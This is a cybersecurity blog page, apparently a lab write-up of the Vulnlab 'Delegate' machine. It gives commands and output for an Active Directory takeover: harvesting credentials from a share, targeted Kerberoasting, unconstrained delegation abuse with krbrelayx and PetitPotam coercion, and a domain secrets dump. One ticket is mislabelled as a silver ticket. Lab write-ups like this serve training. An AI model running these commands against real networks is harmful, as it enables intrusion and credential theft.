@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Initial Enumeration123456789101112131415161718192021222324252627282930Not shown: 65510 filtered tcp ports (no-response)PORT      STATE SERVICE       REASON          VERSION53&#x2F;tcp    open  domain">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VL-Delegate">
+<meta property="og:url" content="https://panosoikogr.github.io/2025/04/02/VL-Delegate/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="Initial Enumeration123456789101112131415161718192021222324252627282930Not shown: 65510 filtered tcp ports (no-response)PORT      STATE SERVICE       REASON          VERSION53&#x2F;tcp    open  domain">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Delegate/smb_guest.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Delegate/strings.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Delegate/foothold.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Delegate/path.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Delegate/delegate.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Delegate/cracked_hash.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Delegate/delegation_priv.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Delegate/machine_acc.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Delegate/deleation.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Delegate/delegation_worked.png">
+<meta property="article:published_time" content="2025-04-01T21:02:05.000Z">
+<meta property="article:modified_time" content="2025-04-01T18:03:03.109Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="VL">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://panosoikogr.github.io/images/Delegate/smb_guest.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/web-app-manifest-192x192.png">
+        
+      
+    
+    <!-- title -->
+    <title>VL-Delegate</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/03/30/VL-Cicada/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/04/02/VL-Delegate/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/04/02/VL-Delegate/&text=VL-Delegate"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/04/02/VL-Delegate/&title=VL-Delegate"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/04/02/VL-Delegate/&is_video=false&description=VL-Delegate"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Delegate&body=Check out this article: https://panosoikogr.github.io/2025/04/02/VL-Delegate/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/04/02/VL-Delegate/&title=VL-Delegate"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/04/02/VL-Delegate/&title=VL-Delegate"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/04/02/VL-Delegate/&title=VL-Delegate"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/04/02/VL-Delegate/&title=VL-Delegate"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/04/02/VL-Delegate/&name=VL-Delegate&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/04/02/VL-Delegate/&t=VL-Delegate"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Enumeration"><span class="toc-number">1.</span> <span class="toc-text">Initial Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-Enumeration"><span class="toc-number">2.</span> <span class="toc-text">SMB Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BloodHound-Analysis"><span class="toc-number">3.</span> <span class="toc-text">BloodHound Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploiting-GenericWrite"><span class="toc-number">3.1.</span> <span class="toc-text">Exploiting GenericWrite</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unconstrained-Delegation-Exploitation"><span class="toc-number">4.</span> <span class="toc-text">Unconstrained Delegation Exploitation</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VL-Delegate
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-01T21:02:05.000Z" class="dt-published" itemprop="datePublished">2025-04-01</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/VL/" rel="tag">VL</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration"></a>Initial Enumeration</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Not shown: 65510 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server </span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">3269/tcp  open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">|_ssl-date: 2025-04-01T16:43:27+00:00; -1h59m53s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=DC1.delegate.vl</span><br><span class="line">| Issuer: commonName=DC1.delegate.vl</span><br><span class="line">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 </span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 </span><br><span class="line">49664/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49665/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49667/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49669/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49672/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49683/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49685/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">64567/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">64591/tcp open  unknown       syn-ack ttl 127</span><br></pre></td></tr></table></figure>
+
+<h2 id="SMB-Enumeration"><a href="#SMB-Enumeration" class="headerlink" title="SMB Enumeration"></a>SMB Enumeration</h2><p>We can get access to the SMB server via a null session:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.64.93 -u &#x27;guest&#x27; -p &#x27;&#x27; --shares</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Delegate/smb_guest.png" alt="SMB Guest Access"></p>
+<p>After gaining access to the NETLOGON share, we find a <code>users.bat</code> file:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.64.93/NETLOGON</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get users.bat</span><br></pre></td></tr></table></figure>
+
+<p>Opening that file reveals credentials for what appears to be an Administrator account, as the command will run when the username is A.Briggs:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings users.bat</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Delegate/strings.png" alt="Strings Output"></p>
+<p>The password didn’t work for Administrator but worked for A.Briggs. This gave us access to LDAP, so the next step was running BloodHound:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap delegate.vl -u &#x27;A.Briggs&#x27; -p &#x27;&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb delegate.vl -u &#x27;A.Briggs&#x27; -p &#x27;&#x27; --shares</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Delegate/foothold.png" alt="Initial Foothold"></p>
+<h2 id="BloodHound-Analysis"><a href="#BloodHound-Analysis" class="headerlink" title="BloodHound Analysis"></a>BloodHound Analysis</h2><p>After analyzing the domain structure, we discovered that we have GenericWrite permissions over N.Thompson, who also has PSRemote access to the Domain Controller - a promising attack path:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap 10.10.64.93 -u &#x27;A.Briggs&#x27; -p &#x27;&#x27; --bloodhound --dns-server 10.10.64.93 -c All --dns-tcp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Delegate/path.png" alt="Attack Path"></p>
+<h3 id="Exploiting-GenericWrite"><a href="#Exploiting-GenericWrite" class="headerlink" title="Exploiting GenericWrite"></a>Exploiting GenericWrite</h3><p>We abused the GenericWrite permissions using targeted Kerberoasting to obtain N.Thompson’s hash and crack the password:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 targetedKerberoast.py -v -d &#x27;delegate.vl&#x27; -u &#x27;a.briggs&#x27; -p &#x27;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Delegate/delegate.png" alt="Kerberoast Results"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat hash9090.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Delegate/cracked_hash.png" alt="Cracked Hash"></p>
+<p>Now we could connect to the machine using WinRM and retrieve the user flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.64.93 -u N.Thompson -p KALEB_2341</span><br></pre></td></tr></table></figure>
+
+<h2 id="Unconstrained-Delegation-Exploitation"><a href="#Unconstrained-Delegation-Exploitation" class="headerlink" title="Unconstrained Delegation Exploitation"></a>Unconstrained Delegation Exploitation</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Delegate/delegation_priv.png" alt="Delegation Privileges"></p>
+<p>According to <a target="_blank" rel="noopener" href="https://blog.harmj0y.net/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/">HarmJ0y’s blog</a>, this GPO is located at <strong>\DOMAIN\sysvol\testlab.local\Policies{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf</strong>. By adding any user SID or username to the <strong>SeEnableDelegationPrivilege</strong> line of the <strong>[Privilege Rights]</strong> section, the setting will take hold whenever the user&#x2F;machine’s current DC reboots or refreshes its group policy.</p>
+<p>This means we can abuse unconstrained delegation by creating a machine account and appending a Service Principal Name (SPN) to it. First, we need to check if the machine quota isn’t set to 0:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc ldap delegate.vl -u N.Thompson -p  -M maq</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Delegate/machine_acc.png" alt="Machine Account Quota"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-addcomputer -dc-ip 10.10.64.93 -computer-pass HelloWorld123 -computer-name Evil delegate.vl/N.Thompson:&#x27;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>Next, we add a DNS record for the machine account we created using <a target="_blank" rel="noopener" href="https://github.com/dirkjanm/krbrelayx/tree/master">krbrelayx</a>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dnstool.py -u &#x27;delegate.vl\Evil$&#x27; -p HelloWorld123 -r Evil.delegate.vl -d 10.8.5.195 --action add DC1.delegate.vl -dns-ip 10.10.64.93</span><br></pre></td></tr></table></figure>
+
+<p>To abuse unconstrained delegation, the machine account needs to have an SPN and <code>TRUSTED_FOR_DELEGATION</code> UAC. We can add the UAC using <code>bloodyAD</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host DC1.delegate.vl -u &#x27;N.Thompson&#x27; -p &#x27;&#x27; -d &#x27;delegate.vl&#x27; add uac &#x27;Evil$&#x27; -f TRUSTED_FOR_DELEGATION</span><br></pre></td></tr></table></figure>
+
+<p>Now we append an SPN with <code>addspn</code> via <code>msDS-AdditionalDnsHostName</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python3 addspn.py -u delegate\\N.Thompson -p &#x27;KALEB_2341&#x27; -s CIFS/Evil.delegate.vl -q dc1.delegate.vl -t &#x27;Evil$&#x27; -dc-ip 10.10.64.93</span><br><span class="line">[-] Connecting to host...</span><br><span class="line">[-] Binding to host</span><br><span class="line">[+] Bind OK</span><br><span class="line">[+] Found modification target</span><br><span class="line">DN: CN=Evil,CN=Computers,DC=delegate,DC=vl - STATUS: Read - READ TIME: 2025-04-01T20:40:40.003792</span><br><span class="line">    msDS-AdditionalDnsHostName: Evil.delegate.vl</span><br><span class="line">    sAMAccountName: Evil$</span><br><span class="line">    servicePrincipalName: cifs/Evil.delegate.vl</span><br></pre></td></tr></table></figure>
+
+<p>Additionally, we’ll add a HOST SPN on the machine we’ve created:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 addspn.py -u delegate\\N.Thompson -p &#x27;KALEB_2341&#x27; -s HOST/Evil.delegate.vl -q dc1.delegate.vl -t &#x27;Evil$&#x27; -dc-ip 10.10.64.93 --additional</span><br></pre></td></tr></table></figure>
+
+<p>First, we need to convert the machine account password to the correct hash format:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iconv -f ASCII -t UTF-16LE &lt;(printf &#x27;HelloWorld123&#x27;) | openssl dgst -md4</span><br><span class="line">MD4(stdin)= 97f8b5c01517c9d59e586246f7c1803c</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ./krbrelayx.py -hashes :97f8b5c01517c9d59e586246f7c1803c</span><br></pre></td></tr></table></figure>
+
+<p>Then we execute PetitPotam to trigger the authentication:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PetitPotam.py -u &#x27;Evil$&#x27; -p &#x27;HelloWorld123&#x27; Evil.delegate.vl 10.10.64.93</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Delegate/deleation.png" alt="Delegation Attack"><br><img src="/images/Delegate/delegation_worked.png" alt="Delegation Success"></p>
+<p>We successfully obtained a silver ticket, which we now import:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -k -no-pass DC1.delegate.vl</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=c2872ceb-fa95-40cc-8623-396d1af89810">https://api.vulnlab.com/api/v1/share?id=c2872ceb-fa95-40cc-8623-396d1af89810</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Enumeration"><span class="toc-number">1.</span> <span class="toc-text">Initial Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-Enumeration"><span class="toc-number">2.</span> <span class="toc-text">SMB Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BloodHound-Analysis"><span class="toc-number">3.</span> <span class="toc-text">BloodHound Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploiting-GenericWrite"><span class="toc-number">3.1.</span> <span class="toc-text">Exploiting GenericWrite</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unconstrained-Delegation-Exploitation"><span class="toc-number">4.</span> <span class="toc-text">Unconstrained Delegation Exploitation</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/04/02/VL-Delegate/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/04/02/VL-Delegate/&text=VL-Delegate"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/04/02/VL-Delegate/&title=VL-Delegate"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/04/02/VL-Delegate/&is_video=false&description=VL-Delegate"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Delegate&body=Check out this article: https://panosoikogr.github.io/2025/04/02/VL-Delegate/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/04/02/VL-Delegate/&title=VL-Delegate"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/04/02/VL-Delegate/&title=VL-Delegate"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/04/02/VL-Delegate/&title=VL-Delegate"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/04/02/VL-Delegate/&title=VL-Delegate"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/04/02/VL-Delegate/&name=VL-Delegate&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/04/02/VL-Delegate/&t=VL-Delegate"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
